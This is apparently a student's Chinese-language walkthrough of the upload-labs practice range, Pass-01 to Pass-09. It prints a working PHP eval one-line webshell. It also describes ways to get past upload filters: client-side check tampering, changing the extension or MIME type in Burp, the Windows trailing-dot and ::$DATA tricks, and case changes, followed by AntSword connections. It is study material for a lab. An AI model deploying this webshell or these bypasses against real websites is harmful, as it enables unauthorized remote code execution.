# 文件上传漏洞  upload-labs靶场合集

## Pass-01 (前端验证)

上传一句话代码的php文件

```
<?php
    @eval($_POST['shell']);
?>
```

将js代码复制到控制台进行修改，强迫调用两次checkFile函数

![72656247540](D:\Users\24982\Desktop\网安学习笔记\assets/1726562475400.png)

则文件上传成功，如下：

![72656253004](D:\Users\24982\Desktop\网安学习笔记\assets/1726562530045.png)

使用蚁剑连接

![72656264674](D:\Users\24982\Desktop\网安学习笔记\assets/1726562646746.png)

原url+文件路径地址，连接密码则是一句话木马里POST中的内容=> shell

![72656266147](D:\Users\24982\Desktop\网安学习笔记\assets/1726562661475.png)

可直接查看源文件

## Pass-02(MIME验证)

首先我查看了源代码，发现这关并没有可以操作的js代码，不属于前端验证的范畴。

考虑使用burpsuite抓包

将php文件先修改成jpg文件，在上传时使用bp拦截，在bp中将后缀修改为php

![72656274084](D:\Users\24982\Desktop\网安学习笔记\assets/1726562740849.png)

放包后可以看到上传成功

![72656279153](D:\Users\24982\Desktop\网安学习笔记\assets/1726562791534.png)

用蚁剑连接可以看到成功向源文件夹注入了shell.php这个木马

![72656282561](D:\Users\24982\Desktop\网安学习笔记\assets/1726562825617.png)

## Pass-03(黑名单验证，特殊后缀)

试探性地上传了shell.php，报错如下

![72656286168](D:\Users\24982\Desktop\网安学习笔记\assets/1726562861688.png)

文件被检查了拓展名，存在黑名单，禁止了这四类文件的上传

使用bp抓包，在bp中修改php的后缀名为php1绕过，后`放包`

![72623077273](D:\Users\24982\Desktop\网安学习笔记\assets/1726562903385.png)

> 注意：此时文件名更改了

![72656293405](D:\Users\24982\Desktop\网安学习笔记\assets/1726562934058.png)



## Pass-04(黑名单验证)

![72656457248](D:\Users\24982\Desktop\网安学习笔记\assets/1726564572485.png)

代码审计：

​	很明显是黑名单验证，发现没有过滤掉htaccess文件（可以利用这个）

同样使用bp抓包，利用Windows特性xxx.php. .

![72656386990](D:\Users\24982\Desktop\网安学习笔记\assets/1726563869909.png)

蚁剑连接

![72656393819](D:\Users\24982\Desktop\网安学习笔记\assets/1726563938199.png)
可以看到我们刚才上传的php文件，说明上传成功

## Pass-05(黑名单验证)

![72656411979](D:\Users\24982\Desktop\网安学习笔记\assets/1726564119791.png)

代码审计:

​	发现同样是黑名单，且过滤掉了php\pHp\htaccess等各种后缀的文件

感觉还是可以利用Windows特性绕过黑名单

![72656427105](D:\Users\24982\Desktop\网安学习笔记\assets/1726564271050.png)

连接蚁剑，可以看到刚才上传的php文件

![72656436786](D:\Users\24982\Desktop\网安学习笔记\assets/1726564367861.png)

## Pass-06

![72656465627](D:\Users\24982\Desktop\网安学习笔记\assets/1726564656276.png)

代码审计：

​	依旧是黑名单验证，但是没有strtolower()函数，因此可以利用大小写绕过

![72656477421](D:\Users\24982\Desktop\网安学习笔记\assets/1726564774213.png)

连接蚁剑看看：

![72656491701](D:\Users\24982\Desktop\网安学习笔记\assets/1726564917012.png)

报错原因不明。。。我也不知道为啥会报错

## Pass-07

![72656517735](D:\Users\24982\Desktop\网安学习笔记\assets/1726565177357.png)

代码审计：

​	黑名单验证，但是没有首尾去空

搜到说可以在文件名后面添加一个空格绕过，但是试了一下，不行诶，暂时保留吧

## Pass-08

![72656570804](D:\Users\24982\Desktop\网安学习笔记\assets/1726565708044.png)

代码审计：

​	这一关没有用deldot删去末尾的点，因此利用这个漏洞绕过

![72656576874](D:\Users\24982\Desktop\网安学习笔记\assets/1726565768747.png)

蚁剑连接:

![72656580917](D:\Users\24982\Desktop\网安学习笔记\assets/1726565809172.png)

## Pass-09

![72656583470](D:\Users\24982\Desktop\网安学习笔记\assets/1726565834701.png)

代码审计：

​	没有去除字符串的str_ireplace()函数，因此这道题应该是使用::$DATA绕过

**php在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持"::$DATA"之前的文件名 他的目的就是不检查后缀名。**

![72656632331](D:\Users\24982\Desktop\网安学习笔记\assets/1726566323319.png)

蚁剑连接：

![72656638524](D:\Users\24982\Desktop\网安学习笔记\assets/1726566385248.png)
























